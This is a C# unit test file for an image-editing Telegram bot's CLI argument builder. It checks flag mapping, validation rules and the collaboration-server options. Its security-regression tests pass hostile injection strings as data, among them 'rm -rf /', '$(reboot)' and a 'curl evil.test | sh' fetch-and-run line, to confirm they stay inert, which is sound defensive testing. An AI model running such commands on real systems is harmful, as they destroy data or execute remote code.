using Stencil.TelegramBot.Domain.Editing;
using Stencil.TelegramBot.Domain.Exceptions;
using Stencil.TelegramBot.Infrastructure.Cli;

namespace Stencil.TelegramBot.Tests;

/// <summary>
/// Parameter → argv mapping and validation guards for <see cref="CliArgvBuilder"/>. A port of
/// <c>mcp/tests/args_test.rs</c>, including the collaboration-server flags
/// (<c>--server</c>/<c>--remote-update</c>/<c>--remote</c>/<c>--remote-name</c>) per
/// <c>cli/CONTRACT.md</c> §1; only mcp's surface-override cases are out of scope.
/// </summary>
public sealed class CliArgvBuilderTests
{
    [Fact]
    public void MinimalInputOutput()
    {
        EditRequest req = new()
        {
            Input = "a.png",
            Output = "out.png",
        };
        Assert.Equal(new[] { "-i", "a.png", "out.png" }, CliArgvBuilder.BuildArgv(req));
    }

    [Fact]
    public void FullPipelineOrderAndFlags()
    {
        EditRequest req = new()
        {
            Input = "photo.jpg",
            CropSpec = "x1=10% x2=90% y1=10% y2=90%",
            Rotate = 1,
            LayoutPath = "/tmp/layout.json",
            Filter = "sepia",
            Output = "out.png",
        };
        Assert.Equal(
            new[]
            {
                "-i", "photo.jpg",
                "-c", "x1=10% x2=90% y1=10% y2=90%",
                "-r", "1",
                "-l", "/tmp/layout.json",
                "--filter", "sepia",
                "out.png",
            },
            CliArgvBuilder.BuildArgv(req));
    }

    [Fact]
    public void NegativeRotateIsPassedThrough()
    {
        EditRequest req = new()
        {
            Input = "a.png",
            Rotate = -1,
            Output = "out.png",
        };
        IReadOnlyList<string> argv = CliArgvBuilder.BuildArgv(req);
        int i = argv.ToList().IndexOf("-r");
        Assert.Equal("-1", argv[i + 1]);
    }

    [Fact]
    public void BlankWithDimsColorAndAlbum()
    {
        EditRequest req = new()
        {
            Blank = new BlankSpec(800, 600, "red"),
            Album = true,
            Output = "out",
        };
        Assert.Equal(
            new[] { "--blank", "800", "600", "red", "--album", "out" },
            CliArgvBuilder.BuildArgv(req));
    }

    [Fact]
    public void BlankDefaultSizeColorOnly()
    {
        EditRequest req = new()
        {
            Blank = new BlankSpec(Color: "#102030"),
            Output = "page.png",
        };
        Assert.Equal(
            new[] { "--blank", "#102030", "page.png" },
            CliArgvBuilder.BuildArgv(req));
    }

    [Fact]
    public void BlankWithPageFormatAndColor()
    {
        EditRequest req = new()
        {
            Blank = new BlankSpec(Color: "pink", Page: "B5"),
            Output = "page.png",
        };
        Assert.Equal(
            new[] { "--blank", "B5", "pink", "page.png" },
            CliArgvBuilder.BuildArgv(req));
    }

    [Fact]
    public void BlankPageAndDimensionsAreMutuallyExclusive()
    {
        EditRequest req = new()
        {
            Blank = new BlankSpec(800, 600, Page: "A5"),
            Output = "out.png",
        };
        StencilCliException ex = Assert.Throws<StencilCliException>(() => CliArgvBuilder.BuildArgv(req));
        Assert.Contains("mutually exclusive", ex.Message);
    }

    [Fact]
    public void FrameFlagForVideo()
    {
        EditRequest req = new()
        {
            Input = "clip.mp4",
            Frame = 24,
            Output = "f.png",
        };
        Assert.Equal(
            new[] { "-i", "clip.mp4", "-f", "24", "f.png" },
            CliArgvBuilder.BuildArgv(req));
    }

    [Fact]
    public void OutputIsPositionalLast()
    {
        EditRequest req = new()
        {
            Input = "a.png",
            Filter = "bw",
            Output = "result.png",
        };
        IReadOnlyList<string> argv = CliArgvBuilder.BuildArgv(req);
        Assert.Equal("result.png", argv[^1]);
    }

    [Fact]
    public void InputAndBlankAreMutuallyExclusive()
    {
        EditRequest req = new()
        {
            Input = "a.png",
            Blank = new BlankSpec(),
            Output = "out.png",
        };
        StencilCliException ex = Assert.Throws<StencilCliException>(() => CliArgvBuilder.BuildArgv(req));
        Assert.Contains("mutually exclusive", ex.Message);
    }

    [Fact]
    public void MissingSourceIsRejected()
    {
        EditRequest req = new()
        {
            Output = "out.png",
        };
        StencilCliException ex = Assert.Throws<StencilCliException>(() => CliArgvBuilder.BuildArgv(req));
        Assert.Contains("no source", ex.Message);
    }

    [Fact]
    public void BlankHalfDimensionsAreRejected()
    {
        EditRequest req = new()
        {
            Blank = new BlankSpec(Width: 800),
            Output = "out.png",
        };
        StencilCliException ex = Assert.Throws<StencilCliException>(() => CliArgvBuilder.BuildArgv(req));
        Assert.Contains("together", ex.Message);
    }

    [Fact]
    public void EmptyOutputIsRejected()
    {
        EditRequest req = new()
        {
            Input = "a.png",
            Output = "   ",
        };
        StencilCliException ex = Assert.Throws<StencilCliException>(() => CliArgvBuilder.BuildArgv(req));
        Assert.Contains("output", ex.Message);
    }

    // ── argv-hardening / SECURITY regressions ─────────────────────────────────
    //
    // argv is built as a token array and handed to ProcessStartInfo.ArgumentList with
    // UseShellExecute=false (see ProcessStencilCli.SpawnAsync), so no shell ever parses these
    // values — token splitting and shell metacharacters are inert by construction. The one
    // residual vector is flag injection through the positional output operand, which
    // BuildArgv now rejects (mirroring build_argv in mcp/src/args.rs). These tests pin both
    // invariants.

    [Theory]
    [InlineData("--output")]
    [InlineData("-l/etc/passwd")]
    [InlineData("--album")]
    [InlineData("; rm -rf /")]
    [InlineData("$(reboot)")]
    [InlineData("`id`")]
    [InlineData("a.png && curl evil.test | sh")]
    public void HostileFlagValueStaysOneOperandAndCannotIntroduceAFlag(string hostile)
    {
        // input/crop/filter are all flag *values*: whatever their content, each rides argv as
        // exactly one element immediately after its own flag, so it can never become a
        // separate CLI flag or split into extra tokens.
        EditRequest req = new()
        {
            Input = hostile,
            CropSpec = hostile,
            Filter = hostile,
            Output = "out.png",
        };
        IReadOnlyList<string> argv = CliArgvBuilder.BuildArgv(req);

        int i = argv.ToList().IndexOf("-i");
        Assert.Equal(hostile, argv[i + 1]);
        int c = argv.ToList().IndexOf("-c");
        Assert.Equal(hostile.Trim(), argv[c + 1]); // CropSpec is trimmed; content otherwise intact
        int f = argv.ToList().IndexOf("--filter");
        Assert.Equal(hostile, argv[f + 1]);

        // No metacharacter ever produces an extra token: each hostile string is present as a
        // whole element, never a fragment of one.
        Assert.Equal(3, argv.Count(a => a == hostile || a == hostile.Trim()));
    }

    [Theory]
    [InlineData("--album")]
    [InlineData("-l")]
    [InlineData("-r")]
    [InlineData("--filter")]
    [InlineData("-")]
    [InlineData("--")]
    public void DashLeadingOutputIsRejectedNoFlagInjection(string badOutput)
    {
        // The output is the positional operand and the CLI has no `--` terminator, so a
        // dash-leading output would be parsed as a flag. BuildArgv rejects it outright.
        EditRequest req = new()
        {
            Input = "a.png",
            Output = badOutput,
        };
        StencilCliException ex = Assert.Throws<StencilCliException>(() => CliArgvBuilder.BuildArgv(req));
        Assert.Contains("must not start with '-'", ex.Message);
    }

    [Theory]
    [InlineData("out.png")]
    [InlineData("./out.png")]
    [InlineData("sub/-weird.png")]
    [InlineData("a-b.png")]
    public void OrdinaryOutputPathsRideAsTheFinalOperand(string good)
    {
        EditRequest req = new()
        {
            Input = "a.png",
            Output = good,
        };
        IReadOnlyList<string> argv = CliArgvBuilder.BuildArgv(req);
        Assert.Equal(good, argv[^1]);
    }

    // ── collaboration server flags ────────────────────────────────────────────

    [Fact]
    public void ServerFetchAndRemoteUpdate()
    {
        EditRequest req = new()
        {
            Server = "http://h:8090",
            Input = "Shared",
            Filter = "sepia",
            RemoteUpdate = true,
            Output = "out.png",
        };
        Assert.Equal(
            new[]
            {
                "--server", "http://h:8090",
                "-i", "Shared",
                "--filter", "sepia",
                "--remote-update",
                "out.png",
            },
            CliArgvBuilder.BuildArgv(req));
    }

    [Fact]
    public void RemoteCreateWithName()
    {
        EditRequest req = new()
        {
            Input = "photo.png",
            Rotate = 1,
            Remote = "http://h:8090",
            RemoteName = "Shared",
            Output = "out.png",
        };
        Assert.Equal(
            new[]
            {
                "-i", "photo.png",
                "-r", "1",
                "--remote", "http://h:8090",
                "--remote-name", "Shared",
                "out.png",
            },
            CliArgvBuilder.BuildArgv(req));
    }

    [Fact]
    public void FetchFromOneServerPublishToAnother()
    {
        EditRequest req = new()
        {
            Server = "http://a:8090",
            Input = "Plans",
            Remote = "http://b:8090",
            RemoteName = "Plans copy",
            Output = "out.png",
        };
        IReadOnlyList<string> argv = CliArgvBuilder.BuildArgv(req);
        Assert.Equal(new[] { "--server", "http://a:8090" }, argv.Take(2));
        int r = argv.ToList().IndexOf("--remote");
        Assert.Equal("http://b:8090", argv[r + 1]);
    }

    [Fact]
    public void ServerWithoutInputIsRejected()
    {
        EditRequest req = new()
        {
            Server = "http://h:8090",
            Output = "out.png",
        };
        StencilCliException ex = Assert.Throws<StencilCliException>(() => CliArgvBuilder.BuildArgv(req));
        Assert.Contains("server", ex.Message);
    }

    [Fact]
    public void ServerWithBlankIsRejected()
    {
        // blank carries a source, so `input` is absent — `server` still can't take a blank.
        EditRequest req = new()
        {
            Server = "http://h:8090",
            Blank = new BlankSpec(),
            Output = "out.png",
        };
        StencilCliException ex = Assert.Throws<StencilCliException>(() => CliArgvBuilder.BuildArgv(req));
        Assert.Contains("blank", ex.Message);
    }

    [Fact]
    public void RemoteUpdateWithoutServerIsRejected()
    {
        EditRequest req = new()
        {
            Input = "a.png",
            RemoteUpdate = true,
            Output = "out.png",
        };
        StencilCliException ex = Assert.Throws<StencilCliException>(() => CliArgvBuilder.BuildArgv(req));
        Assert.Contains("remote_update", ex.Message);
    }

    [Fact]
    public void RemoteNameWithoutRemoteIsRejected()
    {
        EditRequest req = new()
        {
            Input = "a.png",
            RemoteName = "X",
            Output = "out.png",
        };
        StencilCliException ex = Assert.Throws<StencilCliException>(() => CliArgvBuilder.BuildArgv(req));
        Assert.Contains("remote_name", ex.Message);
    }

    [Fact]
    public void BuildArgvReturnsATokenListForArgumentListNoShell()
    {
        // The no-shell guarantee is structural: BuildArgv yields a token list (IReadOnlyList
        // of separate strings), which ProcessStencilCli.SpawnAsync feeds one-by-one into
        // ProcessStartInfo.ArgumentList with UseShellExecute=false — never a single joined
        // command string. A value with spaces stays exactly one token here, proving nothing
        // downstream needs to (or does) re-split on whitespace.
        EditRequest req = new()
        {
            Input = "my file with spaces.png",
            Filter = "sepia and more",
            Output = "out dir/result.png",
        };
        IReadOnlyList<string> argv = CliArgvBuilder.BuildArgv(req);

        Assert.Contains("my file with spaces.png", argv);
        Assert.Contains("sepia and more", argv);
        Assert.Contains("out dir/result.png", argv);
        // Each space-bearing value is a single element — no token was split on whitespace.
        Assert.Equal(1, argv.Count(a => a == "my file with spaces.png"));
    }
}
